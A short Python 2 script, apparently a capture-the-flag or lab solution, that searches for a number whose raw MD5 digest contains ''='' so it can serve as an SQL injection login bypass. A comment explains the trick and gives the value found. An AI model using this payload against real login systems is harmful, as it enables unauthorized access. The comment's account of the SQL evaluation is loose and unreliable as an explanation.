import md5

pword = 0
hash = md5.md5(str(pword)).digest()

while "'='" not in hash:
	pword += 1
	hash = md5.md5(str(pword)).digest()

print pword

""" This code is looking for any hash of a value that counts up from 0 that contains
the string "'='".  This works because first SQL tries to equate a password to the first
string since the line will be password = 'xxxxxxx'='xxxxxx'.  This will be false except
for a small probability so we get FALSE = 'xxxxxx' which, because this string is not
0 will also evaluate to FALSE because FALSE is not equal to not FALSE.

The code takes about 3-4 seconds to execute.  The response you get is 1839431
"""